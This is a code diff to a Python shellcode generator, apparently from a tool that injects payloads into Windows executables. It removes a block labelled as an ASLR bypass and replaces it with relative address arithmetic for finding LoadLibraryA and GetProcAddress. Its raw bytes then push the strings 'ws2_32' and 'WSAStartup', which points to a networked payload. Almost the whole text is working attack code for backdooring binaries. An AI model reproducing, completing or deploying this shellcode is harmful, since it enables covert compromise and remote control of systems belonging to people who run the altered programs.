@@ -543,33 +543,13 @@ class winI32_shellcode():
             print "[!] Binary does not have GetProcAddress API in IAT"
             return False
 
-        #### BEGIN ASLR BYPASS ####
-        # This works because we know the original entry point of the application and
-        # where we are supposed to be as we control where the shellcode goes
         self.shellcode1 = "\xfc"   # CLD
-        self.shellcode1 += "\xbb"  # mov value below ebx
-        self.shellcode1 += struct.pack("<I", flItms['AddressOfEntryPoint'] + flItms['ImageBase'])
-        self.shellcode1 += "\x29\xDA"       # sub edx, ebx
-        self.shellcode1 += "\x83\xFA\x00"   # cmp edx, 0
         self.shellcode1 += "\xbb"           # mov value below to EBX
-        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'])
+        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
         self.shellcode1 += "\xb9"  # mov value below to ECX
-        self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'])
-        # Don't jump if in ASLR env
-        self.shellcode1 += "\x74\x15"  # JZ (XX) # Jump to location after ALSR check
-        #Find the base addr
-        #Base address difference now in ESI
-        self.shellcode1 += "\xb8"  # mov eax, Normal imagebase
-        self.shellcode1 += struct.pack("<I", flItms['ImageBase'])
-        self.shellcode1 += "\x03\xc6"   # add eax, esi  # NOW YOU HAVE ASLR IMAGEBASE in EAX
-        self.shellcode1 += "\xbb"       # mov ebx, the loadlibA offset
-        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryAOffset'])
-        self.shellcode1 += "\xb9"       # mov ecx, the getprocaddr offset
-        self.shellcode1 += struct.pack("<I", flItms['GetProcAddressOffset'])
-        self.shellcode1 += "\x03\xd8"   # add ebx, eax  #EBX will hold LoadlibAoffset
-        self.shellcode1 += "\x01\xc1"   # add ecx, eax  #ECX will hold Getprocaddress
-
-        ####END ASLR BYPASS####
+        self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD1"  # add ECX + EDX
 
         self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                             "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
